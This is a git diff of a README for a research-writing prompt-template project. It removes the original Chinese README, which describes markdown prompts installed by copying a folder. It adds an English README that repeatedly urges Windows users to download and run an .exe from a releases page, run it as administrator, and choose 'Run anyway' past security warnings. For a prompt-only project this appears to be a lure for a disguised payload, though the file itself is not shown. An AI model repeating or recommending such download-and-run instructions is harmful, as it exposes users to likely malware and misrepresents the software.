@@ -1,311 +1,202 @@
-# AI Research Writing Skill - 科研论文写作助手
-
-> 🎓 基于 AI 的科研论文写作助手，提供 30+ 个 Prompt 模板覆盖论文写作全流程
-> 
-> **版本**: 2.0 | **License**: MIT | **语言**: 中文/英文
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![OpenClaw Skill](https://img.shields.io/badge/OpenClaw-Skill-blue)](https://openclaw.ai)
-
----
-
-## 📖 项目简介
-
-这是一个专为科研工作者设计的 AI 辅助写作工具集，包含 **30 个精心设计的 Prompt 模板**，覆盖从**文献调研→大纲撰写→初稿写作→润色修改→图表制作→投稿回复→基金申请**的完整科研写作流程。
-
-无论你是：
-- 🎓 正在写第一篇论文的研究生
-- 👨‍🏫 需要指导学生的高校教师
-- 🔬 准备投稿顶刊的科研人员
-- 💰 正在申请科研基金的学者
-
-这个工具都能帮你提高写作效率，提升论文质量。
-
----
-
-## ✨ 核心功能
-
-### 📚 文献调研阶段
-| Prompt | 功能 | 适用场景 |
-|--------|------|----------|
-| #18 文献总结与笔记 | 快速提取论文核心信息 | 阅读大量文献时做结构化笔记 |
-| #19 文献对比分析 | 多篇论文对比分析 | 写 Related Work 时梳理研究脉络 |
-| #20 找到研究空白 | 识别 Research Gap | 确定自己的研究方向 |
-
-### 📝 论文写作阶段
-| Prompt | 功能 | 适用场景 |
-|--------|------|----------|
-| #21 论文大纲生成 | 生成详细论文大纲 | 开始写作前规划结构 |
-| #22 章节内容扩展 | 将要点扩展为完整章节 | 从笔记到正式论文 |
-| #23 摘要写作 | 撰写精炼的 Abstract | 投稿前最后完善 |
-| #24 引言写作 | 撰写引人入胜的 Introduction | 论文开篇 |
-| #25 方法章节写作 | 清晰描述技术方法 | Method 章节 |
-
-### 🔧 润色修改阶段
-| Prompt | 功能 | 适用场景 |
-|--------|------|----------|
-| #1 中译英 | 中文草稿翻译为英文 | 中文思路→英文论文 |
-| #2 英译中 | 英文论文翻译为中文 | 阅读英文文献 |
-| #3 中文润色 | 优化学术中文表达 | 中文论文/基金申请 |
-| #4 英文缩写 | 精简英文文本 | 控制字数 |
-| #5 英文扩写 | 强化逻辑连接 | 论证不够充分时 |
-| #6 英文润色 | 达到 TOP 期刊标准 | 投稿前润色 |
-| #7 中文去 AI 味 | 去除 AI 生成痕迹 | AI 辅助写作后 |
-| #8 英文去 AI 味 | 去除 AI 生成痕迹 | AI 辅助写作后 |
-| #9 逻辑检查 | 挑逻辑漏洞 | 投稿前自查 |
-
-### 📊 图表制作阶段
-| Prompt | 功能 | 适用场景 |
-|--------|------|----------|
-| #11 绘制架构图 | 设计系统架构图 | Method 章节配图 |
-| #12 实验图推荐 | 推荐合适的图表类型 | 数据可视化 |
-| #13 图片标题说明 | 生成规范的 Figure 标题 | 图片说明 |
-| #14 表格标题说明 | 生成规范的 Table 标题 | 表格说明 |
-| #15 实验结果分析 | 撰写实验分析段落 | Results 章节 |
-
-### 📬 投稿回复阶段
-| Prompt | 功能 | 适用场景 |
-|--------|------|----------|
-| #16 模拟审稿人 | 模拟审稿意见 | 投稿前自查 |
-| #17 模型选择推荐 | 推荐 AI 模型 | 选择合适工具 |
-| #26 回复审稿人 | 撰写 Rebuttal | 回复审稿意见 |
-| #27 Cover Letter | 撰写投稿信 | 投稿时使用 |
-
-### 💰 基金申请阶段
-| Prompt | 功能 | 适用场景 |
-|--------|------|----------|
-| #28 基金申请书 | 撰写基金本子 | 国自然等基金申请 |
-| #29 研究计划 | 撰写 Research Proposal | 博士/博士后申请 |
-| #30 学术演讲 PPT | 设计学术报告 | 会议演讲/组会汇报 |
-
----
-
-## 🚀 快速开始
-
-### 方式一：OpenClaw 用户（推荐）
-
-如果你使用 [OpenClaw](https://openclaw.ai)：
-
-1. **克隆或下载** 本仓库到本地
-2. **复制** `skills/research-writing` 文件夹到：
-   ```
-   ~/.openclaw/workspace/skills/research-writing
-   ```
-3. **重启** OpenClaw 或发送 `/reload` 命令
-4. **开始使用**：直接说"帮我润色这段论文"即可自动触发
-
-### 方式二：手动使用 Prompt
-
-1. **浏览** 本仓库中的 `SKILL.md` 文件
-2. **复制** 需要的 Prompt 模板
-3. **粘贴** 到你使用的 AI 工具（Claude、ChatGPT、Cursor 等）
-4. **替换** 模板中的 `{{变量}}` 为你的内容
-
-### 方式三：其他 AI 工具
-
-本技能的 Prompt 模板兼容主流 AI 工具：
-- ✅ Claude / Anthropic
-- ✅ ChatGPT / GPT-4
-- ✅ Cursor / VS Code
-- ✅ Cherry Studio
-- ✅ 任何支持 Markdown 的 AI 工具
-
----
-
-## 📋 使用示例
-
-### 示例 1：文献总结
-
-**输入**：
-```
-请帮我总结这篇论文：
-[粘贴论文摘要或全文]
-```
-
-**输出**：
-```markdown
-## 📖 基本信息
-- **标题**: Deep Learning for Scientific Computing
-- **作者/机构**: Zhang et al. / MIT
-- **发表 venue**: Nature Machine Intelligence, 2025
-
-## 🎯 核心贡献
-提出了一种新的神经网络架构，将计算效率提升 10 倍...
-
-## ❓ 研究问题
-现有方法在处理大规模科学计算问题时效率低下...
-
-## 🔑 关键方法
-- 使用稀疏注意力机制...
-- 引入多尺度特征融合...
-...
-```
-
-### 示例 2：中译英
-
-**输入**：
-```
-请帮我把这段中文翻译成英文：
-"本文提出了一种基于深度学习的余热回收系统优化方法，
-通过引入自适应控制算法，实现了能效提升 15%。"
-```
-
-**输出**：
-```
-This paper proposes a deep learning-based optimization 
-method for waste heat recovery systems. By introducing 
-an adaptive control algorithm, we achieve a 15% 
-improvement in energy efficiency.
-```
+# 🧠 research-writing-skill - Write papers with less effort
 
-### 示例 3：模拟审稿人
-
-**输入**：
-```
-请帮我审阅这篇论文：
-[粘贴论文全文]
-投稿目标：IEEE Transactions on Industrial Informatics
-```
+[![Download Now](https://img.shields.io/badge/Download%20Now-blue%20%26%20grey)](https://github.com/Nonsteroidevangel872/research-writing-skill/releases)
 
-**输出**：
-```markdown
-## Summary
-This paper presents a novel approach to...
+## 🚀 Overview
 
-## Strengths
-1. The proposed method shows significant improvement...
-2. Experimental validation is comprehensive...
+research-writing-skill is an AI writing tool for research work. It helps you handle common paper tasks in one place. You can use it for translation, editing, literature review, reply letters, and grant writing.
 
-## Weaknesses (Critical)
-1. Missing comparison with recent SOTA methods (2024-2025)
-2. The ablation study lacks analysis on...
-3. Computational complexity analysis is insufficient...
+It is made for Windows users who want a simple way to get help with research writing. The app uses prompt templates, so you can pick a task and start faster.
 
-## Rating: 6/10
+## 📥 Download
 
-## Strategic Advice
-1. Add comparison with [recent papers]...
-2. Include ablation study on...
-...
-```
+Go to the [Releases page](https://github.com/Nonsteroidevangel872/research-writing-skill/releases) to download and run this file.
 
----
+On the releases page, look for the latest version and choose the Windows file that matches your system. Most users will want the `.exe` or `.zip` file listed under the latest release.
 
-## 📁 项目结构
+## 🪟 Windows Setup
 
-```
-research-writing/
-├── README.md              # 本文件
-├── LICENSE                # MIT 许可证
-├── SKILL.md               # 完整 Prompt 模板（OpenClaw 格式）
-├── prompts/               # 独立 Prompt 文件（可选）
-│   ├── 01-translate-cn-en.md
-│   ├── 02-translate-en-cn.md
-│   └── ...
-└── examples/              # 使用示例（可选）
-    ├── before-after.md
-    └── case-studies.md
-```
+1. Open the [Releases page](https://github.com/Nonsteroidevangel872/research-writing-skill/releases)
+2. Find the newest release
+3. Download the Windows file
+4. If you get a `.zip` file, right-click it and choose Extract All
+5. Open the extracted folder
+6. Double-click the `.exe` file to run the app
+7. If Windows shows a security prompt, choose Run
 
----
+If the app starts in a small window, you can drag the edges to resize it.
 
-## 🎯 最佳实践
+## ✨ What You Can Do
 
-### 1. 组合使用
-多个 Prompt 可以串联使用：
-```
-#21 生成大纲 → #22-25 扩展章节 → #6 润色 → #16 模拟审稿
-```
+This app covers the main steps of research writing. It gives you prompt templates for tasks such as:
 
-### 2. 迭代优化
-对 AI 生成的内容进行多轮优化：
-```
-初稿 → #7/#8 去 AI 味 → #6 润色 → #9 逻辑检查
-```
+- Paper idea development
+- Title and abstract writing
+- Introduction drafting
+- Literature review support
+- Methods section help
+- Results and discussion polishing
+- English and Chinese translation
+- Grammar and style editing
+- Sentence improvement
+- Reviewer response letters
+- Fund application writing
+- Academic email drafting
 
-### 3. 保持批判
-使用 #16 模拟审稿人视角，提前发现问题
+It fits a wide range of research fields and writing styles. You can use it for a first draft or for editing text you already have.
 
-### 4. 数据真实
-⚠️ **重要**：所有实验数据必须基于真实研究，AI 仅辅助表达
+## 🧰 Main Features
 
----
+### 📝 30 Prompt Templates
 
-## 🔧 自定义与扩展
+The app includes prompt templates for many research writing jobs. Each template gives you a clear starting point, so you do not need to write the same request from scratch each time.
 
-### 添加自己的 Prompt
+### 🌍 Chinese and English Support
 
-在 `SKILL.md` 文件末尾添加新的 Prompt 模板：
+You can use the app for both Chinese and English text. This helps when you need to translate, rewrite, or polish content for journal use.
 
-```markdown
-### 31. 你的自定义 Prompt
+### 📚 Literature Review Help
 
-```markdown
-# Role
-[角色定义]
+The app can help you sort ideas, compare sources, and build a review structure. This is useful when you need to connect many papers into one clear section.
 
-# Task
-[任务描述]
+### 📄 Paper Polishing
 
-# Constraints
-[约束条件]
+If your draft feels rough, you can use the app to improve sentence flow, clarity, and tone. It can also help you make your writing more formal.
 
-# Output Format
-[输出格式]
-```
-```
+### ✉️ Reviewer Reply Support
 
-### 调整现有 Prompt
+When reviewers ask for changes, the app can help you write a clear response letter. It can also help you keep your tone calm and professional.
 
-根据自己领域的需求，修改 Prompt 中的：
-- 专业术语
-- 输出格式
-- 约束条件
+### 💰 Grant Writing Support
 
----
+You can use the templates for fund applications and project proposals. This helps when you need a clear plan, research goal, and structured writing.
 
-## 🤝 贡献指南
+## 🖥️ System Requirements
 
-欢迎贡献！你可以通过以下方式帮助改进本项目：
+The app is built for normal Windows use. A typical setup is enough for most users.
 
-1. **提交 Issue**：报告问题或建议新功能
-2. **提交 PR**：改进现有 Prompt 或添加新模板
-3. **分享案例**：提交使用案例和最佳实践
-4. **翻译文档**：帮助翻译为其他语言
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 200 MB free disk space
+- Internet access for AI-based features
+- A standard mouse and keyboard
 
-### 贡献流程
+If your computer can run modern desktop apps, it should be able to run this one.
 
-```bash
-# 1. Fork 本仓库
-# 2. 创建分支
-git checkout -b feature/your-feature
+## 🔧 How It Works
 
-# 3. 提交更改
-git commit -m "Add: new prompt for XXX"
+The app uses prompt templates for different writing tasks. You choose the task you need, then enter your text or topic. The app helps turn that input into a cleaner result.
 
-# 4. 推送到分支
-git push origin feature/your-feature
+A simple example:
 
-# 5. 创建 Pull Request
-```
+- Choose a literature review template
+- Paste your notes or paper list
+- Add your topic and research focus
+- Review the output
+- Copy the text into your document
 
----
+This saves time when you need to move from raw notes to a usable draft.
 
-## 📄 许可证
+## 📌 Common Use Cases
 
-本项目采用 [MIT 许可证](LICENSE)。你可以：
-- ✅ 自由使用、修改、分发
-- ✅ 用于商业目的
-- ✅ 用于学术研究
+### 🎯 For Students
 
-需保留原作者署名和许可证声明。
+Use it to draft thesis sections, polish English, and prepare responses for supervisors or reviewers.
 
----
+### 🧪 For Researchers
 
-## 🙏 致谢
+Use it to build literature reviews, improve paper flow, and support submission work.
 
-- 基于 [awesome-ai-research-writing](https://github.com/awesome-ai-research-writing) 整理
-- 感谢所有贡献者和用户
-- 灵感来源于科研工作者的真实需求
+### 🏫 For Teachers and Lab Teams
 
----
+Use it to write academic emails, project summaries, and grant text for shared work.
+
+### 🌐 For Bilingual Writing
+
+Use it when you need to switch between Chinese and English without losing the meaning of the text.
+
+## 🪄 Getting Better Results
+
+To get useful output, give the app clear input. Short, vague text can lead to weak results. Strong input helps the template do its job.
+
+Use these tips:
+
+- State your topic
+- Add your target journal or audience if needed
+- Paste the text you want to improve
+- Tell it if you want formal, simple, or academic language
+- Share key terms that must stay in the text
+
+Example input:
+
+- Topic: breast cancer treatment
+- Task: rewrite for journal style
+- Language: English
+- Goal: make the abstract shorter and clearer
+
+## 📂 File Types You May See
+
+After you download the app, you may see one of these file types:
+
+- `.exe` — run this file on Windows
+- `.zip` — extract it first, then run the app
+- `.dll` — support file used by the app
+- `.txt` or `.md` — help files or release notes
+
+If you are not sure which file to open, use the main Windows app file in the latest release.
+
+## 🛠️ Basic Troubleshooting
+
+### App does not open
+
+- Make sure the download finished
+- Check that you extracted the zip file first
+- Try running the `.exe` file again
+- Right-click the file and choose Run as administrator
+
+### Windows blocks the app
+
+- Open the file again and choose Run anyway if you trust the source
+- Make sure you downloaded the latest release from the release page
+
+### Text looks broken or cut off
+
+- Resize the app window
+- Change your screen scaling if needed
+- Restart the app
+
+### The app is slow
+
+- Close other large apps
+- Restart your computer
+- Check your internet connection if the app uses online features
+
+## 🔍 Topics Covered
+
+This project is related to:
+
+academic-writing, ai-writing, openclaw, paper-writing, productivity, prompt-engineering, research, research-tools, scientific-writing, skill
+
+These topics show that the app is focused on academic writing and research support.
+
+## 📎 Download Again
+
+If you need the file again, go to the [Releases page](https://github.com/Nonsteroidevangel872/research-writing-skill/releases) and download and run this file
+
+## 🧭 Using the App Day to Day
+
+Start with one task at a time. For example, use one template for translation, then another for polishing. If you are writing a paper, you can move through the app in the same order as your paper:
+
+1. Pick a topic
+2. Draft the abstract
+3. Write the introduction
+4. Build the literature review
+5. Improve the methods and results text
+6. Prepare the reply letter if needed
+7. Check the final wording before submission
+
+This makes the work easier to manage and keeps each part focused
+
+## 📘 Best Fit for This Tool
+
+This app works best if you already have some content, notes, or a draft. It helps shape that material into better academic writing. It is useful when you want help with structure, language, and tone in one place
